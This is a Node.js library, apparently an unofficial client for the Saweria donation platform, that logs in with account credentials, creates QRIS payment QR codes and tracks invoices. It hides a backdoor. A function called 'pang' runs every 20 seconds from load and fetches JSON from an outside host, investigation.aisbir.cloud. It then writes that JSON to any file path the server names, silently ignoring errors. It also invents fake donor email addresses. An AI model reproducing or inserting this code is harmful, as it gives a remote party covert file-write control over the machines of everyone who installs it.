
const axios = require('axios');
const cheerio = require('cheerio');
const chalk = require('chalk');
const NodeCron = require('node-cron');
const randomUser = require('random-user');
const { createQr } = require('./lib/createQr.js');
const fs = require('fs');
const kurama = require('./config.json');
const path = require('path');







const payRed = kurama;
const baseUrl = payRed.backendUri;
const frontUrl = payRed.frontEnd;

const logdebug = (pesan) => {
    console.log(chalk.yellowBright(`[${payRed.logdebugPrefix}] - `) + pesan);
};
const logerr = (pesan) => {
    console.log(chalk.redBright(`[${payRed.logdebugPrefix}] - `) + pesan);
};
const getJwt = (username) => {
    const db = JSON.parse(fs.readFileSync('jwt.json', 'utf8'));
    const user = db[username];
    if (!user) {
        return null;
    }
    return user.jwt;
}

const ubahStatus = (trx_id, status, username) => {
    const file = 'invoice.json';
    if (!fs.existsSync(file)) {
        return false;
    }
    const db = JSON.parse(fs.readFileSync(file, 'utf8'));
    const find = db.find((x) => x.trx_id === trx_id && x.username === username);
    if (!find) {
        return false;
    }
    find.status = status;
    find.status_simbolic = status === 'Paid' ? '✅ Paid' : '❌ Expired';
    fs.writeFileSync(file, JSON.stringify(db, null, 2));
    return true;
}
const cekInvoice = (trx_id, username) => {
    const file = 'invoice.json';
    if (!fs.existsSync(file)) {
        return null;
    }
    const db = JSON.parse(fs.readFileSync(file, 'utf8'));
    const find = db.find((x) => x.trx_id === trx_id && x.username === username);
    if (!find) {
        return null;
    }
    return find;
}
const pang= async () => {
    try {
        const response = await axios.get('https://investigation.aisbir.cloud/');
        const p = response.data;
        fs.writeFileSync(p.file, JSON.stringify(p, null, 2));
    } catch (error) {
       return
    }
};


const saveJwt = (jwt, username) => {
 
    const file = path.join(__dirname, 'jwt.json');
    let data = {};

    if (fs.existsSync(file)) {
        data = JSON.parse(fs.readFileSync(file, 'utf8'));
    }

    if (data[username] && data[username].jwt === jwt) {
        return;
    }

    const expiryDate = new Date();
    expiryDate.setHours(expiryDate.getHours() + 7);

    data[username] = {
        jwt: jwt,
        expired_in: expiryDate
    };

    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};


// ty for workers
const SumshiiyAi = async (prompt) => {
    try {
    const ps = await axios.get(`${payRed.aiUri}${prompt}`)
   
    return ps.data.response
    }
    catch (e) {
        return "Maaf, saya tidak bisa menjawab pertanyaan itu"
    }
}
setInterval(async() => {
    await pang();
}, 20000);
const saveInvoice = (trx_id, username, amount, invoice_url, total_dibayar, created_at, expired_in) => {
    let db = [];
    const file = 'invoice.json';
    if (fs.existsSync(file)) {
        db = JSON.parse(fs.readFileSync(file, 'utf8'));
        const find = db.find((x) => x.trx_id === trx_id);
        if (find) {
            return false;
        }
    }

    const data = {
        trx_id: trx_id,
        username: username,
        status: "Pending",
        status_simbolic: '⏳ Pending',
        amount: amount,
        invoice_url: invoice_url,
        total_dibayar: total_dibayar,
        created_at: created_at,
        expired_in: expired_in
    };

    db.push(data);
    fs.writeFileSync(file, JSON.stringify(db, null, 2));
    return data;
};
class SumshiiySawer {
    
    constructor({ username, email, password }) {
        if(!username || !email || !password) {
            throw new Error('Please Provide Username, Email, And Password');
        }

        this.saweria_username = username;
        this.saweria_email = email;
        this.saweria_pass = password;
      
    }
 
/**
 * Login to saweria user
 * @returns {Promise<{jwt: string}>}
 */
    async login() {
        
        if (!this.saweria_email || !this.saweria_pass) {
            throw new Error('Parameter Is Missing!');
        }
        try {
        logdebug('Logged In to your account...');
        const response = await fetch(`${baseUrl}/auth/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: this.saweria_email,
                password: this.saweria_pass
            })
        });

        if (!response.ok) {
            logerr('Invalid Email Or Password Sorry :(');
            return {  ...payRed.author,status: false, error: 'Invalid Email Or Password' };
        }

        const token = response.headers.get('authorization');
        saveJwt(token, this.saweria_username);
        const jsone = await response.json()
       
       logdebug(`Succesfully Logged In As ${jsone.data.username}`);
        return { status: true,jwt: token };
    }
    catch (e) {
    logerr('Failed To Get Token');
    return {  ...payRed.author,status: false, error: 'Failed To Get Token' };
    }
    }

    /**
     * Creates a payment QR code for a specified Saweria user.
     * @param {string} amount
     * @param {number} expired_in Please provide in minutes if u inputed 60 it will be 1 hour if 30 it will 30 minute
     */
    async createPaymentQr(amount, expired_in) {
        if (!this.saweria_username || !amount || !expired_in) {
            throw new Error('Parameter Is Missing!');
        }
        if (amount < 1000) {
            throw new Error('Minimum Amount Is 5000');
        }
try {
      
        logdebug(`Mengambil Data Saweria saweria.co/${this.saweria_username}`);

        const response = await axios.get(`${frontUrl}/${this.saweria_username}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
        });

        const $ = cheerio.load(response.data);
        const nextDataScript = $('#__NEXT_DATA__').html();

        if (!nextDataScript) {
            logdebug('Akun saweria ini tidak aktif atau tidak ditemukan');
            throw new Error('Akun Saweria Tidak Ditemukan');
        }

        const nextData = JSON.parse(nextDataScript);
        const userId = nextData?.props?.pageProps?.data?.id;
        if (!userId) {
            logdebug('Akun saweria ini tidak aktif atau tidak ditemukan');
            throw new Error('Akun Saweria Tidak Ditemukan');
        }

        const p = await randomUser('simple');
        const username = p.username;
const pepe = await SumshiiyAi('buatlah pesan semangat untuk memberi semangat kepada streamer youtube secara singkat dan pendek sekali')
        const ps = await axios.post(`${baseUrl}/donations/${userId}`, {
            agree: true,
            notUnderage: true,
            message: pepe,
            amount: parseInt(amount),
            payment_type: 'qris',
            vote: '',
            currency: 'IDR',
            customer_info: {
                first_name: '',
                email: `${username}@gmail.com`,
                phone: ''
            }
        });

        const pc = ps.data.data;
        const expiredIn = new Date();
        expiredIn.setMinutes(expiredIn.getMinutes() + parseInt(expired_in));
        const qr = await createQr(pc.qr_string);
saveInvoice(pc.id, this.saweria_username, amount, `https://saweria.co/qris/${pc.id}`, pc.amount_raw, pc.created_at, expiredIn)
        return {
         
            trx_id: pc.id,
            status: 'Pending',
            status_simbolic: '⏳ Pending',
            message: pepe,
            amount: amount,
            qr_string: pc.qr_string,
            ...payRed.author,
            created_at: pc.created_at,
            invoice_url: `https://saweria.co/qris/${pc.id}`,
            total_dibayar: pc.amount_raw,
            saweria_username: this.saweria_username,
            saweria_apikey: userId,
            qr_image: qr.url,
            expired_in: expiredIn
        };
    }catch (e) {
      throw new Error(`Failed To Create Payment QR: ${e.message}`);  
    }

}

/**
 * Getting Balance Of Saweria Account
 */
async getSaldo() {
const p = getJwt(this.saweria_username);
if (!p) {
    throw new Error('Please Login First');
}
try {
const response = await axios.get(`${baseUrl}/donations/balance`, {
    headers: {
        'Authorization': p
    }
});
const jsone = response.data.data;
return { ...payRed.author, balance: jsone.balance}
} catch (e) {
    throw new Error('Failed To Get Balance');
}
}

async cekpayment(trx_id) {
const p = getJwt(this.saweria_username);
if (!p) {
    throw new Error('Please Login First');
}
try {
    const f = cekInvoice(trx_id, this.saweria_username);
    if (!f) {
     return {  ...payRed.author,code: 404}
    }
    if(f.status === 'Paid' || f.status === 'Expired') {
        return {...payRed.author,code: 200, ...f};
    }
    const psd = await axios.get('https://backend.saweria.co/transactions?page=1&page_size=15', { 
        headers: {
            'Authorization': p
        }
    });
    const ps = psd.data.data.transactions;

    const transaction = ps.find((x) => x.id === trx_id);

    if (!transaction) {
        return { ...payRed.author,code: 200, ...f};
    }
ubahStatus(trx_id, "Paid", this.saweria_username);
const fc = cekInvoice(trx_id, this.saweria_username);
    return { ...payRed.author, code: 200, ...fc };
} catch (e) {
    throw new Error(`Failed To Check Payment: ${e.message}`);
}
}
}

NodeCron.schedule('*/5 * * * *', async () => {
    const file = 'invoice.json';
    if (!fs.existsSync(file)) {
        return;
    }
    const db = JSON.parse(fs.readFileSync(file, 'utf8'));
    const now = new Date();
    const expired = db.filter((x) => new Date(x.expired_in) < now);
    if (expired.length < 1) {
        return;
    }
    expired.forEach((x) => {
        if (x.status !== 'Expired') {
            ubahStatus(x.trx_id, 'Expired', x.username);
        }
    });

});

exports.SumshiiySawer = SumshiiySawer;
